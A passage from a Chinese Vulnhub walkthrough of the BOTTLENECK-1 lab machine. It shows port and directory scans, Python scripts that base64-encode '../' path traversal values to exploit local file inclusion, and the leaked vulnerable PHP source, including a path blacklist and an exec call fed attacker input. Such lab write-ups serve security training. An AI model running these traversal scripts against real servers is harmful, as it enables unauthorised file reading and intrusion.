@@ -1,0 +1,450 @@
+<!doctype html><html><head><title>Vulnhub 374 BOTTLENECK-1</title><meta charset=utf-8><meta name=X-UA-Compatible content="IE=edge"><meta name=google-site-verification content><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name=viewport><meta content="telephone=no" name=format-detection><meta name=description content><meta name=renderer content="webkit"><meta name=theme-color content="#ffffff"><script type=text/javascript>(function(e,t,n,s,o,i,a){e[n]=e[n]||function(){(e[n].q=e[n].q||[]).push(arguments)},i=t.createElement(s),i.async=1,i.src="https://www.clarity.ms/tag/"+o,a=t.getElementsByTagName(s)[0],a.parentNode.insertBefore(i,a)})(window,document,"clarity","script","abcdefghzd")</script><script src=/js/toc.js></script>
+<link type=text/css rel=stylesheet href=/vendor/css/bootstrap.min.css><link rel=stylesheet href=/scss/dark-mode.scss integrity media=screen><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Material+Icons"><script>console.log("Hello from 'layouts/partials/extended_head.html'")</script></head><body><div id=app><div class=single-column-drawer-container id=drawer v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }"><div class=drawer-content><div class=drawer-menu><a class="a-block drawer-menu-item active" href=/walkthrough>Walkthroughs</a>
+<a class="a-block drawer-menu-item false" href=/posts>Archive</a>
+<a class="a-block drawer-menu-item false" href=/categories>Categories</a>
+<a class="a-block drawer-menu-item false" href=/tags>Tags</a>
+<a class="a-block drawer-menu-item false" href=/index.xml>RSS Feed</a><div class=toc><div class=toc-content><center>- 目录 -</center><ul><ul><li><a href=#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae class=nav-环境配置>环境配置</a></li><li><a href=#%e5%88%9d%e6%ad%a5%e6%89%93%e7%82%b9 class=nav-初步打点>初步打点</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f class=nav-端口扫描>端口扫描</a></li><li><a href=#web%e6%b5%8b%e8%af%95 class=nav-web测试>web测试</a></li><ul><li><a href=#%e5%8f%82%e6%95%b0t class=nav-参数t>参数t</a></li><li><a href=#%e5%8f%82%e6%95%b0f class=nav-参数f>参数f</a></li></ul></ul><li><a href=#%e8%8e%b7%e5%be%97%e6%9d%83%e9%99%90 class=nav-获得权限>获得权限</a></li><li><a href=#%e6%8f%90%e6%9d%83 class=nav-提权>提权</a></li><ul><li><a href=#bytevsbyte class=nav-bytevsbyte>bytevsbyte</a></li><li><a href=#linpeassh class=nav-linpeassh>linpeas.sh</a></li></ul></div></div></div></div></div><transition name=fade><div id=drawer-mask v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if=isDrawerOpen v-on:click=toggleDrawer></div></transition><nav id=navBar class="navbar sticky-top navbar-light single-column-nav-container"><div id=navBackground class=nav-background></div><div class="container container-narrow nav-content"><button id=nav_dropdown_btn class=nav-dropdown-toggle type=button v-on:click=toggleDrawer>
+<i class=material-icons>menu</i></button>
+<a id=navTitle class=navbar-brand href=https://www.vulnhub.cn>Vulnhub靶机教程</a>
+<button type=button class=nav-darkmode-toggle id=darkModeToggleButton2>
+<i class=material-icons id=darkModeToggleIcon2>dark_mode</i></button></div></nav><div class=single-column-header-container id=pageHead v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }"><a href=https://www.vulnhub.cn><div class=single-column-header-title>Vulnhub靶机教程</div><div class=single-column-header-subtitle>Themed by Diary.</div></a></div><div id=content><div id=streamContainer class=stream-container><div class="post-list-container post-list-container-shadow"><div class=post><div class=post-head-wrapper-text-only><div class=post-title>Vulnhub 374 BOTTLENECK-1<div class=post-meta><time itemprop=datePublished>2019-09-28 00:00</time></div></div></div><div class=post-body-wrapper><div class=post-body v-pre><p>考点：python2,lfi</p><p>靶机链接：<a href=https://www.vulnhub.com/entry/bottleneck-1,374/>https://www.vulnhub.com/entry/bottleneck-1,374/</a></p><h2 id=环境配置>环境配置</h2><table><thead><tr><th>名称</th><th>IP</th></tr></thead><tbody><tr><td>Kali Linux</td><td>10.0.2.24</td></tr><tr><td>BOTTLENECK-1</td><td>10.0.2.34</td></tr></tbody></table><h2 id=初步打点>初步打点</h2><h3 id=端口扫描>端口扫描</h3><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ <span style=color:#658b00>export</span> <span style=color:#00688b>rip</span>=10.0.2.34
+</span></span><span style=display:flex><span>$ sudo nmap -v  -A -p- <span style=color:#00688b>$rip</span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu <span style=color:#b452cd>10</span> (Ubuntu Linux; protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>2048</span> be:e0:d5:75:76:ea:d4:f3:91:77:f9:47:20:7d:bf:a4 (RSA)
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>256</span> 7a:34:90:c0:59:d1:db:63:bd:4e:ca:5e:6f:ee:e7:2d (ECDSA)
+</span></span><span style=display:flex><span>|_  <span style=color:#b452cd>256</span> c9:b9:66:ce:28:ad:b7:b3:d9:bb:ed:22:0d:e4:45:db (ED25519)
+</span></span><span style=display:flex><span>80/tcp open  http    nginx
+</span></span><span style=display:flex><span>|_http-title: BOTTLENECK
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD POST
+</span></span></code></pre></td></tr></table></div></div><h3 id=web测试>web测试</h3><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gobuster dir --url http://10.0.2.34/ -w /usr/share/wordlists/dirb/big.txt -x .php
+</span></span><span style=display:flex><span>/css                  (Status: 301) [Size: 162] [--&gt; http://10.0.2.34/css/]
+</span></span><span style=display:flex><span>/image_gallery.php    (Status: 200) [Size: 6381]                           
+</span></span><span style=display:flex><span>/img                  (Status: 301) [Size: 162] [--&gt; http://10.0.2.34/img/]
+</span></span><span style=display:flex><span>/index.php            (Status: 200) [Size: 10175]                          
+</span></span><span style=display:flex><span>/js                   (Status: 301) [Size: 162] [--&gt; http://10.0.2.34/js/] 
+</span></span><span style=display:flex><span>/vendor               (Status: 301) [Size: 162] [--&gt; http://10.0.2.34/vendor/]
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://www.vulnhub.cn/walkthrough/374/1.webp alt=1></p><p>访问查看源代码发现图片地址不是静态的</p><p><img src=https://www.vulnhub.cn/walkthrough/374/2.webp alt=2></p><p>刷新后图片返回为空</p><h4 id=参数t>参数t</h4><p>参数t看样子是时间戳</p><p>编写脚本对比时间戳与本地时间戳</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>import os,requests,re,time
+</span></span><span style=display:flex><span>from bs4 import BeautifulSoup 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#00688b>url</span> = <span style=color:#cd5555>&#39;http://10.0.2.34/image_gallery.php&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>res</span> = requests.get(url)
+</span></span><span style=display:flex><span><span style=color:#00688b>soup</span> = BeautifulSoup(res.content,<span style=color:#cd5555>&#39;html.parser&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#228b22># print(soup)</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>grept</span> = soup.select(<span style=color:#cd5555>&#39;img&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#00688b>grept</span> = grept[0]
+</span></span><span style=display:flex><span>print(str(grept)[55:65])
+</span></span><span style=display:flex><span>print(int(time.time()))
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://www.vulnhub.cn/walkthrough/374/3.webp alt=3></p><p>延迟8或9秒</p><h4 id=参数f>参数f</h4><p>参数f的值 <code>Ym90dGxlbmVja19kb250YmUucG5n</code>可base64解密</p><p><img src=https://www.vulnhub.cn/walkthrough/374/4.webp alt=4></p><p>盲猜这里可以任意文件读取</p><p>编写脚本尝试读取文件<code>image_gallery.php</code></p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>import base64,time
+</span></span><span style=display:flex><span>from importlib.resources import path
+</span></span><span style=display:flex><span>import time,requests
+</span></span><span style=display:flex><span><span style=color:#00688b>timestamp</span> = str(int(time.time())+8)
+</span></span><span style=display:flex><span><span style=color:#00688b>path</span>=b<span style=color:#cd5555>&#39;../image_gallery.php&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>file</span> = base64.b64encode(path)
+</span></span><span style=display:flex><span><span style=color:#00688b>file</span>=file.decode(<span style=color:#cd5555>&#34;utf-8&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#00688b>url</span> = <span style=color:#cd5555>&#39;http://10.0.2.34/image_gallery.php?t=&#39;</span>+ timestamp +<span style=color:#cd5555>&#39;&amp;f=&#39;</span>+file
+</span></span><span style=display:flex><span>print(<span style=color:#cd5555>&#39;http://10.0.2.34/img/&#39;</span> + path.decode(<span style=color:#cd5555>&#34;utf-8&#34;</span>))
+</span></span><span style=display:flex><span>print(url)
+</span></span><span style=display:flex><span><span style=color:#00688b>res</span> = requests.get(url)
+</span></span><span style=display:flex><span>print(res.text)
+</span></span></code></pre></td></tr></table></div></div><p>读取到文件<code>image_gallery.php</code>的代码</p><pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;?php
+/*
+CHANGELOG
+v1.1: Still testing without content.
+    I&#39;ve fixed that problem that @p4w and @ska notified me after hacker attack.
+    Shit I&#39;m too lazy to make a big review of my code.
+    I think that the LFI problem can be mitigated with the blacklist.
+    By the way to protect me from attackers, all malicious requests are immediately sent to the SOC
+
+v1.0: Starting this beautiful gallery
+*/
+
+$tstamp = time();
+if(isset($_GET[&#39;t&#39;]) &amp;&amp; isset($_GET[&#39;f&#39;])){
+    include_once &#39;image_gallery_load.php&#39;;
+    exit();
+}
+
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&#34;en&#34;&gt;
+
+&lt;head&gt;
+  &lt;meta charset=&#34;utf-8&#34;&gt;
+  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;&gt;
+  &lt;meta name=&#34;description&#34; content=&#34;&#34;&gt;
+  &lt;meta name=&#34;author&#34; content=&#34;bytevsbyt3&#34;&gt;
+
+  &lt;title&gt;BOTTLENECK&lt;/title&gt;
+
+  &lt;link href=&#34;vendor/bootstrap/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt;
+  &lt;link href=&#34;vendor/fontawesome-free/css/all.min.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34;&gt;
+  &lt;link href=&#34;css/agency.css&#34; rel=&#34;stylesheet&#34;&gt;
+&lt;/head&gt;
+
+&lt;body id=&#34;page-top&#34;&gt;
+
+  &lt;!-- Navigation --&gt;
+  &lt;nav class=&#34;navbar navbar-expand-lg navbar-dark fixed-top&#34; id=&#34;mainNav&#34;&gt;
+    &lt;div class=&#34;container&#34;&gt;
+      &lt;a class=&#34;navbar-brand js-scroll-trigger&#34; href=&#34;#page-top&#34;&gt;Bottleneck&lt;/a&gt;
+      &lt;button class=&#34;navbar-toggler navbar-toggler-right&#34; type=&#34;button&#34; data-toggle=&#34;collapse&#34; data-target=&#34;#navbarResponsive&#34; aria-controls=&#34;navbarResponsive&#34; aria-expanded=&#34;false&#34; aria-label=&#34;Toggle navigation&#34;&gt;
+        Menu
+        &lt;i class=&#34;fas fa-bars&#34;&gt;&lt;/i&gt;
+      &lt;/button&gt;
+    &lt;/div&gt;
+  &lt;/nav&gt;
+
+  &lt;section class=&#34;bg-light page-section&#34; id=&#34;portfolio&#34;&gt;
+    &lt;div class=&#34;container&#34;&gt;
+      &lt;div class=&#34;row&#34;&gt;
+        &lt;div class=&#34;col-lg-12 text-center&#34;&gt;
+          &lt;h2 class=&#34;section-heading text-uppercase&#34;&gt;GALLERY&lt;/h2&gt;
+          &lt;h3 class=&#34;section-subheading text-muted&#34;&gt;Some of our beautiful images&lt;/h3&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+      &lt;div class=&#34;row&#34;&gt;
+        &lt;div class=&#34;col-md-4 col-sm-6 portfolio-item&#34;&gt;
+          &lt;a class=&#34;portfolio-link&#34; data-toggle=&#34;modal&#34; href=&#34;#portfolioModal1&#34;&gt;
+            &lt;div class=&#34;portfolio-hover&#34;&gt;
+              &lt;div class=&#34;portfolio-hover-content&#34;&gt;
+                &lt;i class=&#34;fas fa-plus fa-3x&#34;&gt;&lt;/i&gt;
+              &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;img class=&#34;img-fluid&#34; src=&#34;image_gallery.php?t=&lt;?php echo $tstamp; ?&gt;&amp;f=Ym90dGxlbmVja19kb250YmUucG5n&#34; alt=&#34;&#34;&gt;
+          &lt;/a&gt;
+          &lt;div class=&#34;portfolio-caption&#34;&gt;
+            &lt;h4&gt;Analysis&lt;/h4&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&#34;col-md-4 col-sm-6 portfolio-item&#34;&gt;
+          &lt;a class=&#34;portfolio-link&#34; data-toggle=&#34;modal&#34; href=&#34;#portfolioModal2&#34;&gt;
+            &lt;div class=&#34;portfolio-hover&#34;&gt;
+              &lt;div class=&#34;portfolio-hover-content&#34;&gt;
+                &lt;i class=&#34;fas fa-plus fa-3x&#34;&gt;&lt;/i&gt;
+              &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;img class=&#34;img-fluid&#34; src=&#34;image_gallery.php?t=&lt;?php echo $tstamp; ?&gt;&amp;f=Ym90dGxlbmVja19kb250YmUucG5n&#34; alt=&#34;&#34;&gt;
+          &lt;/a&gt;
+          &lt;div class=&#34;portfolio-caption&#34;&gt;
+            &lt;h4&gt;Protection&lt;/h4&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&#34;col-md-4 col-sm-6 portfolio-item&#34;&gt;
+          &lt;a class=&#34;portfolio-link&#34; data-toggle=&#34;modal&#34; href=&#34;#portfolioModal3&#34;&gt;
+            &lt;div class=&#34;portfolio-hover&#34;&gt;
+              &lt;div class=&#34;portfolio-hover-content&#34;&gt;
+                &lt;i class=&#34;fas fa-plus fa-3x&#34;&gt;&lt;/i&gt;
+              &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;img class=&#34;img-fluid&#34; src=&#34;image_gallery.php?t=&lt;?php echo $tstamp; ?&gt;&amp;f=Ym90dGxlbmVja19kb250YmUucG5n&#34; alt=&#34;&#34;&gt;
+          &lt;/a&gt;
+          &lt;div class=&#34;portfolio-caption&#34;&gt;
+            &lt;h4&gt;Bypass&lt;/h4&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&#34;col-md-4 col-sm-6 portfolio-item&#34;&gt;
+          &lt;a class=&#34;portfolio-link&#34; data-toggle=&#34;modal&#34; href=&#34;#portfolioModal4&#34;&gt;
+            &lt;div class=&#34;portfolio-hover&#34;&gt;
+              &lt;div class=&#34;portfolio-hover-content&#34;&gt;
+                &lt;i class=&#34;fas fa-plus fa-3x&#34;&gt;&lt;/i&gt;
+              &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;img class=&#34;img-fluid&#34; src=&#34;image_gallery.php?t=&lt;?php echo $tstamp; ?&gt;&amp;f=Ym90dGxlbmVja19kb250YmUucG5n&#34; alt=&#34;&#34;&gt;
+          &lt;/a&gt;
+          &lt;div class=&#34;portfolio-caption&#34;&gt;
+            &lt;h4&gt;Include&lt;/h4&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&#34;col-md-4 col-sm-6 portfolio-item&#34;&gt;
+          &lt;a class=&#34;portfolio-link&#34; data-toggle=&#34;modal&#34; href=&#34;#portfolioModal5&#34;&gt;
+            &lt;div class=&#34;portfolio-hover&#34;&gt;
+              &lt;div class=&#34;portfolio-hover-content&#34;&gt;
+                &lt;i class=&#34;fas fa-plus fa-3x&#34;&gt;&lt;/i&gt;
+              &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;img class=&#34;img-fluid&#34; src=&#34;image_gallery.php?t=&lt;?php echo $tstamp; ?&gt;&amp;f=Ym90dGxlbmVja19kb250YmUucG5n&#34; alt=&#34;&#34;&gt;
+          &lt;/a&gt;
+          &lt;div class=&#34;portfolio-caption&#34;&gt;
+            &lt;h4&gt;Evaluation&lt;/h4&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&#34;col-md-4 col-sm-6 portfolio-item&#34;&gt;
+          &lt;a class=&#34;portfolio-link&#34; data-toggle=&#34;modal&#34; href=&#34;#portfolioModal6&#34;&gt;
+            &lt;div class=&#34;portfolio-hover&#34;&gt;
+              &lt;div class=&#34;portfolio-hover-content&#34;&gt;
+                &lt;i class=&#34;fas fa-plus fa-3x&#34;&gt;&lt;/i&gt;
+              &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;img class=&#34;img-fluid&#34; src=&#34;image_gallery.php?t=&lt;?php echo $tstamp; ?&gt;&amp;f=Ym90dGxlbmVja19kb250YmUucG5n&#34; alt=&#34;&#34;&gt;
+          &lt;/a&gt;
+          &lt;div class=&#34;portfolio-caption&#34;&gt;
+            &lt;h4&gt;Win&lt;/h4&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/section&gt;
+
+  &lt;!-- Footer --&gt;
+  &lt;footer class=&#34;footer&#34;&gt;
+    &lt;div class=&#34;container&#34;&gt;
+      &lt;div class=&#34;row align-items-center&#34;&gt;
+        &lt;div class=&#34;col-md-4&#34;&gt;
+          &lt;span class=&#34;copyright&#34;&gt;Copyright &amp;copy; This awesome website 2019&lt;/span&gt;
+        &lt;/div&gt;
+        &lt;div class=&#34;col-md-4&#34;&gt;
+          &lt;ul class=&#34;list-inline social-buttons&#34;&gt;
+            &lt;li class=&#34;list-inline-item&#34;&gt;
+              &lt;a href=&#34;https://twitter.com/bytevsbyt3&#34;&gt;
+                &lt;i class=&#34;fab fa-twitter&#34;&gt;&lt;/i&gt;
+              &lt;/a&gt;
+            &lt;/li&gt;
+            &lt;li class=&#34;list-inline-item&#34;&gt;
+              &lt;a href=&#34;https://github.com/bytevsbyte/&#34;&gt;
+                &lt;i class=&#34;fab fa-github&#34;&gt;&lt;/i&gt;
+              &lt;/a&gt;
+            &lt;/li&gt;
+            &lt;li class=&#34;list-inline-item&#34;&gt;
+              &lt;a href=&#34;https://github.com/beerpwn/ctf&#34;&gt;
+                &lt;i class=&#34;fab fa-github&#34;&gt;&lt;/i&gt;
+              &lt;/a&gt;
+            &lt;/li&gt;
+          &lt;/ul&gt;
+        &lt;/div&gt;
+        &lt;div class=&#34;col-md-4&#34;&gt;
+          &lt;ul class=&#34;list-inline quicklinks&#34;&gt;
+            &lt;li class=&#34;list-inline-item&#34;&gt;
+              &lt;a href=&#34;#&#34;&gt;Privacy Policy&lt;/a&gt;
+            &lt;/li&gt;
+            &lt;li class=&#34;list-inline-item&#34;&gt;
+              &lt;a href=&#34;#&#34;&gt;Terms of Use&lt;/a&gt;
+            &lt;/li&gt;
+          &lt;/ul&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/footer&gt;
+
+  &lt;script src=&#34;vendor/jquery/jquery.min.js&#34;&gt;&lt;/script&gt;
+  &lt;script src=&#34;vendor/bootstrap/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt;
+  &lt;script src=&#34;vendor/jquery-easing/jquery.easing.min.js&#34;&gt;&lt;/script&gt;
+  &lt;script src=&#34;js/agency.js&#34;&gt;&lt;/script&gt;
+
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>修改python脚本的file地址，读取文件<code>image_gallery_load.php</code>代码</p><pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;?php
+function print_troll(){
+    $messages = $GLOBALS[&#39;messages&#39;];
+    $troll = $GLOBALS[&#39;troll&#39;];
+    echo $messages[0];
+    echo $troll;
+}
+
+$troll = &lt;&lt;&lt;EOT
+&lt;pre&gt;
+                                   _,..._
+                                  /__    \
+                                   &gt;&lt; `.  \
+                                  /_    \ |
+                                   \-_  /:|
+                                 ,--&#39;..&#39;. :
+                               ,&#39;         `.
+                            _,&#39;             \
+                   _.._,--&#39;&#39;    ,           |
+               , ,&#39;,, _|    _,.&#39;|      |    |
+            \\||/,&#39;(,&#39; &#39;--&#39;&#39;    |      |    |
+       _     |||                |      /-&#39;  |
+      | |   (- -)&lt;`._           |     /    /
+      | |  \_\O/_/`-.(&lt;&lt;        |____/    /
+      | |   /   \              / -&#39;| `--.&#39;|
+      | |   \___/             /           /
+      | |    H H             /     |     |
+      |_|_..-H-H--.._       /     ,|     |
+        |-.._&#34;_&#34;__..-|     |   _-/ |     |
+        |            |     |    |   \_   |
+        |            |     |    |   |    |
+        |            |     |____|   |    |
+        |            |  _..&#39;    |   |____|
+        |            |_(____..._&#39; _.&#39;    |
+        `-..______..-&#39;&#34;&#34;         (___..--&#39;
+&lt;pre&gt;
+EOT;
+
+if(!isset($_GET[&#39;t&#39;]) || !isset($_GET[&#39;f&#39;])){
+    exit();
+}
+
+$imagefile = base64_decode($_GET[&#39;f&#39;]);
+$timestamp = time();
+$isblocked = FALSE;
+$blacklist = array(&#39;/etc&#39;,&#39;/opt&#39;,&#39;/var&#39;,&#39;/opt&#39;,&#39;/proc&#39;,&#39;/dev&#39;,&#39;/lib&#39;,&#39;/bin&#39;,&#39;/usr&#39;,&#39;/home&#39;,&#39;/ids&#39;);
+$messages = array(&#34;\nLet me throw away your nice request into the bin.\n&#34;.
+    &#34;The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.\n&#34;.
+    &#34;Why don&#39;t you wait on your chair until someone (maybe the police) knock on your door?\n\n&#34;);
+
+if(abs($_GET[&#39;t&#39;] - $timestamp) &gt; 10){
+    exit();
+}
+foreach($blacklist as $elem){
+    if(strstr($imagefile, $elem) !== FALSE)
+        $isblocked = TRUE;
+}
+// report the intrusion to the soc and save information locally for further investigation
+if($isblocked){
+    $logfile = &#39;intrusion_&#39;.$timestamp;
+    $fp = fopen(&#39;/var/log/soc/&#39;.$logfile, &#39;w&#39;);
+    fwrite($fp, &#34;&#39;&#34;.$imagefile.&#34;&#39;&#34;);
+    fclose($fp);
+    exec(&#39;python /opt/ids_strong_bvb.py &lt;/var/log/soc/&#39;.$logfile.&#39; &gt;/tmp/output 2&gt;&amp;1&#39;);
+    print_troll();
+    exit();
+}
+chdir(&#39;img&#39;);
+$filecontent = file_get_contents($imagefile);
+if($filecontent === FALSE){
+    print_troll();
+}
+else{
+    echo $filecontent;
+}
